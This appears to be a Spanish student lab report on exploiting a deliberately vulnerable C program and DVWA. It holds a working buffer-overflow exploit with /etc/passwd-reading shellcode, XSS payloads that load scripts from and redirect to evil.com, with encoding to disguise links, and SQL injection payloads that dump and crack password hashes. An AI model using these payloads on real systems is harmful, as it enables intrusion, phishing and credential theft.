# Vulnerabilidades Web y uso de mod-security

## 👨 Autor
---

- Diego Enrique Fontán Lorenzo [77482941N]

## 🅰️ Buffer Overflow
---

### 📦 Compilación y ejecución

Primero compilamos el siguiente código escrito en C:

```c
// desbordamiento.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
char* crear_pin_aleatorio() {
        char* pin = (char *) malloc(5);;  
        srand(time(0));  // Inicializa generador de nos. aleatorios
        sprintf(pin, "%04d", rand()%10000);
        return pin;
}

int main(int argc, char *argv[]) {
        char pin_secreto[5];
        strcpy(pin_secreto, crear_pin_aleatorio());

        char pin_leido[5];
        printf("Introducir PIN: ");
        gets(pin_leido);   // No comprueba tamano de entrada

        if (strcmp(pin_leido, pin_secreto) == 0){
           printf("Acceso concedido, pin correcto\n");
        }
        else {
           printf("Acceso denegado, pin incorrecto\n");
        }

        printf("PISTA:\n pin secreto: %s\n pin leido: %s\n", pin_secreto,pin_leido);
}
```

Para compilarlo, es importante desactivar las protecciones contra el `stack smashing`. Para hacerlo ejecutamos el siguiente comando:

```sh
# Con protección (por defecto usa -fstack-protector-all)
gcc -o desbordamiento-no-vulnerable desbordamiento.c
# Sin protección
gcc -fno-stack-protector -o desbordamiento-vulnerable desbordamiento.c
```

Si ejecutamos cualquiera de los dos programas generados,
el resultado será el siguiente:

```sh
Introducir PIN: ESEI
Acceso denegado, pin incorrecto
PISTA:
 pin secreto: 0614
 pin leido: ESEI
```

Si volvemos a ejecutarlo, vemos que el pin cambia dinámicamente y que nos acepta cualquier caracter mediante la entrada estándar del sistema.

Si probamos a ejecutar los comandos con una entrada mayor a la deseada, obtendremos los siguientes resultados:

```sh
# ./desbordamiento-no-vulnerable
Introducir PIN: SEGURIDAD
Acceso denegado, pin incorrecto
PISTA:
 pin secreto: 6581
 pin leido: SEGURIDAD
*** stack smashing detected ***: <unknown> terminated
Abortado (`core` generado)
# ./desbordamiento-vulnerable
Introducir PIN: SEGURIDAD
Acceso denegado, pin incorrecto
PISTA:
 pin secreto: IDAD
 pin leido: SEGURIDAD
# ./desbordamiento-vulnerable
Introducir PIN: DEMASIADA SEGURIDAD
Acceso denegado, pin incorrecto
PISTA:
 pin secreto: IADA SEGURIDAD
 pin leido: DEMASIADA SEGURIDAD
Violación de segmento (`core` generado)
```

En el `desbordamiento-no-vulnerable` vemos que salta una alerta y que el PIN generado se mantiene.

En el `desbordamiento-vulnerable` vemos dos posibles salidas:

- El PIN generado se sobreescribe sin causar la ruptura del programa.
- El PIN generado se sobreescribe pero causamos la ruptura del programa.

### 💭 ¿Por qué pasa esto?

A grandes rasgos, el **Stack** de la función principal del programa es el siguiente:

| **STACK** |
| --- |
| ... |
| pin leído |
| pin secreto |
| ... |
| return pointer |
| ... |

La función `gets` nos permite introducir en el `pin leído` el valor que deseemos. El problema es que no se preocupa de la cantidad de caracteres que insertamos.

Ambos PIN tienen un espacio reservado de 5 caracteres como máximo (4 para el PIN y uno para el fin de string).

Si introducimos una entrada mayor a 5 caracteres, los valores inferiores del **Stack** se sobreescriben.

De esta forma seremos capaces de designar el PIN secreto deseado o incluso de modificar la dirección de retorno.

### 💣 Explotación

Podemos explotar este programa de muchas maneras. La más sencilla será generar un texto con dos strings iguales para, de esta manera, sobreescribir ambos PIN.

Usaremos cualquier programa que nos permita mostrar caracteres sin representación ASCII:

```sh
echo -e "Esei\x00Esei" | ./desbordamiento-vulnerable

python -c "print('HACK\0HACK')" | ./desbordamiento-vulnerable

perl -e 'print "0000\x000000"' | ./desbordamiento-vulnerable
```

Cualquiera de estos comandos nos dará el siguiente resultado:

```sh
Introducir PIN: Acceso concedido, pin correcto
```

### 🔒 Corrección

La función `gets` habría de ser reemplazada por otra más segura. Por ejemplo:

```c
fgets(pin_leido, 4, stdin);
```

En este caso, el PIN introducido siempre será de 3 dígitos (dado que el cuarto pertenece al fin de cadena `\0`). De esta forma prevenimos este tipo de **Buffer Overflow**.

### 💎 ¡EXTRA! Más cosas divertidas

Aunque esto no entra dentro de la práctica, me he visto en la obligación de hacerlo. Podemos ejecutar comandos arbitrarios a partir del programa vulnerable. Para ello, vamos a recompilarlo de la siguiente manera:

```sh
gcc -fno-stack-protector -z execstack -o desbordamiento-vulnerable desbordamiento.c
```

Con el flag `-z execstack` nos aseguramos de que cualquier código en ensamblador que metamos dentro del **Stack** puede llegar a ejecutarse si el *Instruction Pointer* apunta directamente a dicha dirección.

El **exploit** lo vamos a realizar de la siguiente manera:

1. Como ya sabemos que el programa es vulnerable al desbordamiento de buffer, intentaremos sobreescribir la dirección de retorno para que apunte a donde nosotros queramos.
2. ¿A dónde nos interesa que apunte? Pues en este caso al **Stack**, dado que tenemos control sobre él, pudiendo sobreescribirlo a nuestro antojo.
3. Dentro del **Stack** incluiremos código ensamblador (a partir de ahora llamado `shellcode`).

Para ello, lo primero es encontrar mediante un *debugger* -en mi caso `gdb`- el tamaño exacto de la entrada que nos permita sobreescribir la posición de retorno:

```sh
echo 'AAAABBBBCCCCDDDDEEEE' > pattern
gdb -q desbordamiento-vulnerable
        r < pattern
                Starting program: desbordamiento-vulnerable < pattern
                Introducir PIN: Acceso denegado, pin incorrecto
                PISTA:
                pin secreto: BBBCCCCDDDDEEEE
                pin leido: AAAABBBBCCCCDDDDEEEE

                Program received signal SIGSEGV, Segmentation fault.

                0x00007ffff7004545 in ?? ()
```

Como podemos ver, la última línea es `0x00007ffff7004545 in ?? ()`. Si nos fijamos en los últimos números de la dirección, observamos que es `...4545` o, traducido a ASCII, `..EE`. Por lo tanto, a partir de la segunda `E` de nuesto *pattern* podemos sobreescribir la dirección de retorno:

```py
#!/usr/bin/env python2

# AAAABBBBCCCCDDDDEE<retorno>
# Hay 18 bytes antes del retorno

offset = 'A' * 18
ret = ''

print(offset + ret)
```

> A partir de ahora escribiré un script de Python para ir facilitando la tarea de generar el exploit

Volviendo al gdb hacemos el comando `info registers` para ver la posición del **Stack**:

| Stack Pointer | Arquitectura |
| --- | --- |
| rsp | x86_64 |
| esp | x86 |

> En mi caso trabajo con 64bit

```
rsp            0x7fffffffde10	0x7fffffffde10
```

Teniendo la dirección, actualizamos el exploit:

```py
#!/usr/bin/env python2

offset = 'A' * 18
# Debe ir en hexadecimal
ret = '\x7f\xff\xff\xff\xde\x10'
# Le tenemos que dar la vuelta por el modelo Little-Endian
ret = ret[::-1]

print(offset + ret)
```

Ahora sólo falta añadir nuestro `shellcode`. Para facilitarlo, he buscado uno para `Linux x86_64` en [shell-storm.org](https://shell-storm.org) que me permita leer el archivo `/etc/passwd`:

```py
shellcode = '\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41'
```

Sólamente queda juntar todo y, por hacerlo más bonito, modificaremos el offset de tal manera que además de ejecutar el comando, podamos saltarnos el PIN:

```py
#!/usr/bin/env python2

bypass = 'HACK\0HACK\0'
offset = 'A' * 18
ret = '\x7f\xff\xff\xff\xde\x10'[::-1]
shellcode = '\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41'

print(bypass + offset + ret + shellcode)
```

Ahora sólamente guardamos el *exploit* en un archivo y lo ejecutamos con `gdb` para ver qué ocurre:

```
python2 exploit.py > exploit
gdb -q desbordamiento-vulnerable
    r < exploit
        Starting program: desbordamiento-vulnerable < exploit
        Introducir PIN: Acceso concedido, pin correcto
        PISTA:
        pin secreto: HACK
        pin leido: HACK
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
                [...]
        hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
        geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
        gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
        gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
        ssi:x:1000:1000:SSI Buff Overflow,,,:/home/ssi:/bin/bash
        [Inferior 1 (process 56194) exited with code 01]
```

**¡Conseguido!** ¡Hemos sido capaces de ejecutar comandos arbritarios aprovechando la vulnerabilidad del programa!

## 🅱️ Web Exploiting
---

> ⚠️ Dado que las máquinas virtuales no funcionan correctamente en ninguno de mis ordenadores, como ya se ha notificado vía e-mail, los apartados de XSS y SQLi se realizarán en máquinas vulnerables a dichos fallos, como `Damn Vulnerable Web Application` o similares. En compensación, se realizará un estudio más detallado de dichas vulnerabilidades

### 🔧 Preparación del entorno

Iniciaremos la máquina contenedora de `DVWA` y nos loguearemos con el las credenciales:

        admin:password

Una vez dentro, iremos al apartado `DVWA Security` y bajaremos el nivel de seguridad a **low**.

### 👩‍🎨 XSS

Para probar los ataques `XSS`, tenemos dos opciones:

- XSS Reflected
- XSS Stored

En mi caso usaré XSS Reflected para realizar pruebas volátiles sin necesidad de reiniciar o eliminar los *payloads*.

En este apartado podemos observar que nos pregunta nuestro nombre y que, si introducimos `Kike`, nos muestra el mensaje:

        Hello Kike

Antes de atacar, vamos a comprobar el código que nos ofrece `DVWA` sobre cómo funciona la aplicación:

```php
<?php

if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){

 $isempty = true;

} else {
        
 echo '<pre>';
 echo 'Hello ' . $_GET['name'];
 echo '</pre>';
    
}

?> 
```

Como podemos observar, sólamente comprueba y obtiene el valor del parámetro `name` pasado mediante peticiones `GET` y lo añade directamente entre etiquetas `<pre>`.

No es difícil imaginar que si le pasamos cualquier código `HTML` lo podremos visualizar con el formato especificado, dado que no comprueba si la entrada consta de caracteres especiales como `<` o `>`:

Varios ejemplos:

- `<b>XSS</b>`
- `<h1>XSS</h1>`
- `<marquee>XSS</marquee>` (Este es visualmente bonito)

Pero más allá de formatear texto de maneras vistosas, los ataque XSS sirven para ejecutar código javascript o modificar el comportamiento de la página.

Si introducimos código entre etiquetas `<script>`, podemos obtener resultados muy interesantes:

- `<script>alert('XSS')</script>`
- `<script>alert(domain.cookie)</script>` (obtener las cookies de un usuario)
- `<script src="http://evil.com/payload.js"></script>` (bypassear el límite de caracteres del payload pudiendo ejecutar código remoto)

Además también puede ser usado como vector de ataque en campañas de `phishing`, redireccionando a un usuario de la página real a un clon propiedad del atacante:

- `<script>window.location="http://evil.com/"</script>`

---

Algo muy interesante de esto, es que vimos los datos de entrada vienen dados mediante el parámetro `name` provisto en la URL, por lo que podremos realizar estos ataques sólamente pasándole el link malicioso a nuestra víctima:

        https://dwva.local/vulnerabilities/xss_r/?name=<script>alert("HACKED")</script>

Aún así cualquiera podría sospechar de este link, por lo que lo recomendable sería usar un **URL Encoder**:

        https://dwva.local/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22Hacked%22%29%3C%2Fscript%3E

Aún así, sigue siendo un link bastante raro por poder leerse palabras como `script`, `alert` o `HACKED`, por lo que, personalmente, me gusta codificar los *payloads* en hexadecimal:

        https://dwva.local/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%41%43%4b%45%44%22%29%3c%2f%73%63%72%69%70%74%3e

### 🕵️‍♂️ SQLi

Esta vez atacaremos la página mediante `SQL Injection`, lo que nos permitirá acceder a la base de datos.

Para ello, nos iremos a la pestaña `SQL Injection` dentro de `DVWA` y, como de costumbre, nos fijaremos primero en el código `php` que sostiene la página:

```php
<?php    

if(isset($_GET['Submit'])){
    
    // Retrieve data
    
    $id = $_GET['id'];

    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );

    $num = mysql_numrows($result);

    $i = 0;

    while ($i < $num) {

        $first = mysql_result($result,$i,"first_name");
        $last = mysql_result($result,$i,"last_name");
        
        echo '<pre>';
        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
        echo '</pre>';

        $i++;
    }
}
?>
```

Igual que antes, vemos que sería posible un ataque `XSS` dado que el parámetro `id` se muestra directamente en la página sin ningún tipo de comprobación, pero lo que nos interesa a nosotros ahora mismo es que en la consulta SQL, dicho parámetro se añade en crudo, por lo que podríamos escribir aquello que más nos convenga.

Primero comprobaremos la existencia del error introduciendo una comilla simple `'`. El mensaje que recibimos es el siguiente:

        You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1

Como podemos observar, la página nos devuelve un error (que viene dado por la línea de código `or die('<pre>' . mysql_error() . '</pre>' );`).

En cambio, si introducimos números, podemos comprobar la existencia de todos los usuarios:

        ID: 1
        First name: admin
        Surname: admin

Para evitar que se ejecute la primera parte de la sentencia, usaremos el truco: 

```sql
' or 0=1
```

Con esto conseguimos que siempre sea falso y nunca nos muestre dicha sentencia programada por defecto.

Ahora necesitamos **unir** la secuencia que deseemos. En mi caso, accederé a la tabla `dvwa.users` que contiene toda la información sobre los usuarios:

```sql
' or 0=1 UNION SELECT * FROM dvwa.users #
```

> Con el último símbolo (`#`) nos aseguramos de que cualquier cosa que siga a la sentencia es un comentario.

En cambio, al ejecutar esta sentencia nos aparece un error:

        The used SELECT statements have a different number of columns

Esto viene dado porque en la sentencia original sólamente se muestran dos columnas, por lo que no podemos unir nuestra sentencia si no tiene exactamente dos columnas:

```sql
' or 0=1 UNION SELECT user,password FROM dvwa.users #
```

Una vez corregida, sólamente nos queda ejecutar la sentencia:

        ID: ' or 0=1 UNION SELECT user,password FROM dvwa.users #
        First name: admin
        Surname: 5f4dcc3b5aa765d61d8327deb882cf99

        ID: ' or 0=1 UNION SELECT user,password FROM dvwa.users #
        First name: gordonb
        Surname: e99a18c428cb38d5f260853678922e03

        ID: ' or 0=1 UNION SELECT user,password FROM dvwa.users #
        First name: 1337
        Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

        ID: ' or 0=1 UNION SELECT user,password FROM dvwa.users #
        First name: pablo
        Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

        ID: ' or 0=1 UNION SELECT user,password FROM dvwa.users #
        First name: smithy
        Surname: 5f4dcc3b5aa765d61d8327deb882cf99

Como podemos observar, ya tenemos acceso a la información de la base de datos.

En mi caso ya sabía qué podía obtener de la base de datos, pero aquí dejo mi procedimiento estándar para realizar este tipo de ataques:

- Para saber cuántas columnas puedo mostrar, realizo el comando `1 order by XXX #` hasta que de error, donde `XXX` es un número que empieza en 1 y voy incrementando en cada petición.

- Una vez sepa cuántas columnas puedo mostrar,
realizo el comando `' or 0=1 union all select XXX #`, donde `XXX` es la sucesión de columnas válidas (en este ejemplo sería `1,2` dado que sólo tenemos dos columnas).

- Para obtener la versión de la base de datos, reemplazo uno de los números por `@@version` o `version()`. SQL: `' or 0=1 union all select @@version,version() #`

        ID: ' or 0=1 union all select @@version,version() #
        First name: 5.1.65-community-log
        Surname: 5.1.65-community-log

- Si la base de datos es MySQL < 5, entonces trato de adivinar el nombre de las tablas.

- Si la base de datos es MySQL >= 5, entonces miro la información alojada en `information_schema` mediante el comando:

```sql
' or 0=1 union all select 1,table_name from information_schema.tables #
```

        ID: ' or 0=1 union all select 1,table_name from information_schema.tables #
        First name: 1
        Surname: CHARACTER_SETS

        ID: ' or 0=1 union all select 1,table_name from information_schema.tables #
        First name: 1
        Surname: COLLATIONS

                --- [...] ---

        ID: ' or 0=1 union all select 1,table_name from information_schema.tables #
        First name: 1
        Surname: guestbook

        ID: ' or 0=1 union all select 1,table_name from information_schema.tables #
        First name: 1
        Surname: users

- El nombre de las columnas se puede averiguar mediante: 

```sql
' or 0=1 union all select 1,column_name from information_schema.columns #
```

De aquí en adelante ya todo es **imaginación** y **picardía**.

---

Un dato importante, es que al conseguir los usuarios y contraseñas, vimos que las contraseñas no estaban en texto plano:

        gordonb:e99a18c428cb38d5f260853678922e03

Por la longitud y el formato es fácil preveer que es un `MD5`, lo cual nos viene genial porque en la práctica también pasa lo mismo.

En este caso, si buscamos en páginas como `HashKiller.co.uk` (la cual es de mis favoritas), vemos que dicho `MD5` corresponde a la contraseña `abc123`.

